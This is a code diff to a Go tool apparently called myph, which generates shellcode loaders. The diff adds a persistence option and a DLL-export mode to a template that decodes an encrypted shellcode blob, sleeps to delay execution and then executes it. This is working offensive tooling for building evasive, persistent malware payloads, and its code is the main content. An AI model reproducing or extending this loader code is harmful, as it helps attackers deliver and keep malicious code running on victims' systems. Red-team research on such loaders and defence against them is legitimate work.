@@ -79,7 +79,7 @@ func DirExists(dir string) (bool, error) {
 	return false, err
 }
 
-func CreateTmpProjectRoot(path string) error {
+func CreateTmpProjectRoot(path string, persist string) error {
 
 	fmt.Printf("[+] Initializing temporary build directory\n")
 
@@ -104,7 +104,7 @@ func CreateTmpProjectRoot(path string) error {
 	}
 
 	var go_mod = []byte(`
-module github.com/cmepw/myph
+module whatever
 
 go 1.19
 
@@ -123,6 +123,11 @@ go 1.19
 	encryptgo_path := fmt.Sprintf("%s/encrypt.go", path)
 	_, _ = os.Create(encryptgo_path)
 
+	if persist != "" {
+		encryptgo_path := fmt.Sprintf("%s/persist.go", path)
+		_, _ = os.Create(encryptgo_path)
+	}
+
 	println("\n")
 	return nil
 }
@@ -132,6 +137,8 @@ func GetMainTemplate(
 	key string,
 	sc string,
 	sleepTime uint,
+	persistData string,
+	shouldExport bool,
 ) string {
 
 	/* if hex encoding is used, it does not require to go through StdEncoding */
@@ -139,7 +146,15 @@ func GetMainTemplate(
 	if encoding == "hex" {
 		encCall = "enc"
 	}
-
+	exportImpStr := `import "C"`
+	exportexpStr := `
+func main() {}
+//export entry
+func entry() {`
+	if !shouldExport {
+		exportImpStr = ""
+		exportexpStr = "func main() {"
+	}
 	return fmt.Sprintf(`
 package main
 
@@ -147,12 +162,13 @@ import (
     "time"
     "os"
     enc "encoding/%s"
+	"fmt"
 )
 
+%s
 var Key = %s
 var Code = %s
-
-func main() {
+%s
 
     decodedSc, _ := %s.DecodeString(Code)
     decodedKey, _ := %s.DecodeString(Key)
@@ -163,7 +179,9 @@ func main() {
     }
 
     time.Sleep(%d * time.Second)
+
+	  %s
     ExecuteOrderSixtySix(decrypted)
 }
-    `, encoding, key, sc, encCall, encCall, sleepTime)
+    `, encoding, exportImpStr, key, sc, exportexpStr, encCall, encCall, sleepTime, persistData)
 }
